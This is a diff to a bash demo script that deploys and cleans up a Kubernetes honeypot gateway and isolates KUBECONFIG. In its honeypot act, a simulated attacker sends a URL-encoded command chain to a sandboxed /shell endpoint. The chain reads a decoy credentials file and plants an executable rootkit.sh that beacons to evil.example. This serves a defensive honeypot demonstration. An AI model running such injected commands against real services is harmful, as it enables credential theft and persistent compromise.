@@ -33,12 +33,16 @@ REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
 ATESPACE="anything-but-agents"
 ROUTER_URL="${ROUTER_URL:-http://localhost:8000}"
 PAUSE_BETWEEN_STEPS="${PAUSE_BETWEEN_STEPS:-1}"
+export PATH="/usr/bin/go/bin:${PATH}"
 export PATH="$(go env GOPATH)/bin:${PATH}"
 
-# Load local .env if present; fall back to parent .ate-dev-env.sh if present.
+# Load local .env if present; fall back to worktree parent .env or parent .ate-dev-env.sh if present.
 if [[ -f "${REPO_ROOT}/.env" ]]; then
   # shellcheck disable=SC1091
   source "${REPO_ROOT}/.env"
+elif [[ -f "${REPO_ROOT}/../../.env" ]]; then
+  # shellcheck disable=SC1091
+  source "${REPO_ROOT}/../../.env"
 elif [[ -f "${REPO_ROOT}/../.ate-dev-env.sh" ]]; then
   # shellcheck disable=SC1091
   source "${REPO_ROOT}/../.ate-dev-env.sh"
@@ -70,7 +74,9 @@ apply_env_defaults() {
     for candidate in \
       "${REPO_ROOT}/.." \
       "${REPO_ROOT}/../../agent-substrate/substrate" \
-      "${REPO_ROOT}/../../agent-substrate/b-substrate"; do
+      "${REPO_ROOT}/../../agent-substrate/b-substrate" \
+      "${REPO_ROOT}/../../../../agent-substrate/substrate" \
+      "${REPO_ROOT}/../../../../agent-substrate/b-substrate"; do
       if [[ -d "${candidate}/tools/setup-gcp" ]]; then
         SUBSTRATE_ROOT="$(cd "${candidate}" && pwd)"
         break
@@ -78,7 +84,22 @@ apply_env_defaults() {
     done
     export SUBSTRATE_ROOT="${SUBSTRATE_ROOT:-$(cd "${REPO_ROOT}/.." && pwd)}"
   fi
+
+  # Isolate KUBECONFIG so concurrent kubectl sessions on the same machine cannot
+  # switch current-context away from the target GKE cluster mid-demo.
+  local src_kubeconfig="${KUBECONFIG:-${HOME}/.kube/config}"
+  local isolated_kubeconfig="/tmp/kubeconfig-${CLUSTER_NAME}"
+  if [[ -f "${src_kubeconfig}" && "${src_kubeconfig}" != "${isolated_kubeconfig}" ]]; then
+    cp "${src_kubeconfig}" "${isolated_kubeconfig}"
+    export KUBECONFIG="${isolated_kubeconfig}"
+  fi
+  local target_ctx="${KUBE_CONTEXT:-gke_${PROJECT_ID}_${CLUSTER_LOCATION}_${CLUSTER_NAME}}"
+  kubectl config use-context "${target_ctx}" >/dev/null 2>&1 || true
 }
+
+if [[ -n "${PROJECT_ID:-}" ]]; then
+  apply_env_defaults
+fi
 
 banner() {
   echo ""
@@ -562,12 +583,11 @@ act4_honeypot() {
   run_cmd kubectl ate create actor honeypot-203-0-113-5 -a "${ATESPACE}" --template honeypot
   run_cmd kubectl ate create actor honeypot-198-51-100-9 -a "${ATESPACE}" --template honeypot
 
-  step "2. Attacker 203.0.113.5 exploits /shell (real sh in gVisor), steals decoy DB creds, and plants /tmp/honeypot/rootkit.sh -> Auto-Checkpoint saved!"
+  step "2. Attacker 203.0.113.5 exploits /shell (real sh in gVisor), steals decoy DB creds, and plants /tmp/honeypot/rootkit.sh"
   run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-203-0-113-5" \
     "${ROUTER_URL}/shell?cmd=id+%26%26+cat+payroll_db_credentials.env.bak+%26%26+echo+'curl+evil.example/beacon'+>+rootkit.sh+%26%26+chmod+%2Bx+rootkit.sh+%26%26+ls+-la"
-  run_cmd kubectl ate save actor honeypot-203-0-113-5 -a "${ATESPACE}"
 
-  step "3. Attacker disconnects -> suspend honeypot-203-0-113-5 to GCS (\$0 compute while idle)"
+  step "3. Attacker disconnects -> suspend honeypot-203-0-113-5 to GCS (checkpointing rootkit.sh + RAM forensics at \$0 idle compute)"
   run_cmd kubectl ate suspend actor honeypot-203-0-113-5 -a "${ATESPACE}"
 
   step "4. Meanwhile, Attacker 198.51.100.9 probes /shell and sees a completely clean Golden Snapshot filesystem"
@@ -588,6 +608,90 @@ act4_honeypot() {
   fi
 
   kill "${HONEYPOT_GW_PID:-}" 2>/dev/null || true
+  free_workers
+}
+
+deploy_honeypot_gateway() {
+  detect_cluster_defaults
+  banner "Deploying In-Cluster Honeypot Split-Screen Gateway & LoadBalancer"
+
+  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true
+
+  # Ensure ActorTemplate honeypot is rebuilt and Golden Snapshot is READY
+  kubectl ate delete actor-template honeypot -a "${ATESPACE}" 2>/dev/null || true
+  (
+    cd "${REPO_ROOT}"
+    envsubst < "manifests/honeypot-template.yaml.tmpl" \
+      | ko resolve -f - \
+      | kubectl ate create actor-template -f -
+  )
+
+  echo "Waiting for 'honeypot' Golden Snapshot to become READY..."
+  for ((i = 1; i <= 60; i++)); do
+    yaml_out="$(kubectl ate get actor-template honeypot -a "${ATESPACE}" -o yaml 2>/dev/null || true)"
+    golden_tag="$(echo "${yaml_out}" | awk '/takeGoldenSnapshotAt:/ {print $2; exit}')"
+    err_msg="$(echo "${yaml_out}" | awk -F': ' '/errorMessage:/ {print $2; exit}')"
+    if [[ -n "${golden_tag}" ]]; then
+      echo "  [READY] honeypot (snapshot taken at: ${golden_tag})"
+      break
+    fi
+    if [[ -n "${err_msg}" ]]; then
+      echo "  [ERROR] honeypot: ${err_msg}" >&2
+      exit 1
+    fi
+    sleep 2
+  done
+
+  if [[ -z "${KUBECTL_ATE_IMAGE:-}" ]]; then
+    KUBECTL_ATE_IMAGE="$(kubectl get deployment dungeon2d-gateway -n anything-but-agents -o jsonpath='{.spec.template.spec.initContainers[0].image}' 2>/dev/null || true)"
+  fi
+  if [[ -z "${KUBECTL_ATE_IMAGE:-}" ]]; then
+    if [[ -n "${SUBSTRATE_ROOT:-}" && -d "${SUBSTRATE_ROOT}" ]]; then
+      echo "Building kubectl-ate container image from ${SUBSTRATE_ROOT}..."
+      KUBECTL_ATE_IMAGE="$(
+        cd "${SUBSTRATE_ROOT}"
+        KO_CONFIG_PATH="${REPO_ROOT}/.ko.yaml" ko build ./cmd/kubectl-ate --platform=linux/amd64
+      )"
+    else
+      echo "ERROR: Set KUBECTL_ATE_IMAGE or SUBSTRATE_ROOT to deploy honeypot-gateway." >&2
+      exit 1
+    fi
+  fi
+  export KUBECTL_ATE_IMAGE
+
+  (
+    cd "${REPO_ROOT}"
+    envsubst < "manifests/honeypot-gateway.yaml.tmpl" \
+      | ko resolve --platform=linux/amd64 -f - \
+      | kubectl apply -f -
+  )
+  kubectl rollout status deployment/honeypot-gateway -n anything-but-agents --timeout=120s
+
+  local lb_ip=""
+  for _ in {1..30}; do
+    lb_ip="$(kubectl get svc honeypot-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"
+    if [[ -n "${lb_ip}" ]]; then
+      break
+    fi
+    sleep 2
+  done
+
+  echo ""
+  echo "  Truman Show Honeypot Split-Screen UI (Public) : http://${lb_ip:-<pending>}/"
+  echo ""
+}
+
+cleanup_honeypot_gateway() {
+  banner "Cleaning up Honeypot Gateway Deployment & Actors"
+  for act in $(kubectl ate get actors -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^honeypot-/ {print $2}' || true); do
+    kubectl ate delete actor "${act}" -a "${ATESPACE}" --any-state 2>/dev/null || true
+  done
+  for tag in $(kubectl ate get tags -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^tag-(honeypot|forensic)/ {print $2}' || true); do
+    kubectl ate delete tag "${tag}" -a "${ATESPACE}" 2>/dev/null || true
+  done
+  kubectl delete deployment,service,serviceaccount honeypot-gateway -n anything-but-agents --ignore-not-found
+  kubectl delete role,rolebinding honeypot-gateway-token-minter -n ate-system --ignore-not-found
+  kubectl delete clusterrole,clusterrolebinding honeypot-gateway-ate-client --ignore-not-found
   free_workers
 }
 
@@ -624,6 +728,7 @@ run_all_acts() {
 cleanup_all() {
   banner "Cleaning up 'Anything But Agents' resources"
   cleanup_dungeon2d_gateway
+  cleanup_honeypot_gateway
   for actor in hero-mofi hero-timeline-b d2d-mofi d2d-mofi-timeline-b clone-1 clone-2 clone-3 db-acme db-globex honeypot-203-0-113-5 honeypot-198-51-100-9 honeypot-forensic-lab raft-leader-1; do
     kubectl ate delete actor "${actor}" -a "${ATESPACE}" --any-state 2>/dev/null || true
   done
@@ -641,6 +746,8 @@ case "${1:-}" in
   deploy)            deploy_all ;;
   deploy-dungeon2d)  deploy_dungeon2d_gateway ;;
   cleanup-dungeon2d) cleanup_dungeon2d_gateway ;;
+  deploy-honeypot)   deploy_honeypot_gateway ;;
+  cleanup-honeypot)  cleanup_honeypot_gateway ;;
   run-all)           run_all_acts ;;
   act1-dungeon)      act1_dungeon ;;
   act1b-dungeon2d)   act1b_dungeon2d ;;
@@ -650,7 +757,7 @@ case "${1:-}" in
   act5-timewarp)     act5_timewarp ;;
   cleanup)           cleanup_all ;;
   *)
-    echo "Usage: $0 {bootstrap-gke|deploy|deploy-dungeon2d|cleanup-dungeon2d|run-all|act1-dungeon|act1b-dungeon2d|act2-coldstart|act3-tenantdb|act4-honeypot|act5-timewarp|cleanup}" >&2
+    echo "Usage: $0 {bootstrap-gke|deploy|deploy-dungeon2d|cleanup-dungeon2d|deploy-honeypot|cleanup-honeypot|run-all|act1-dungeon|act1b-dungeon2d|act2-coldstart|act3-tenantdb|act4-honeypot|act5-timewarp|cleanup}" >&2
     exit 1
     ;;
 esac
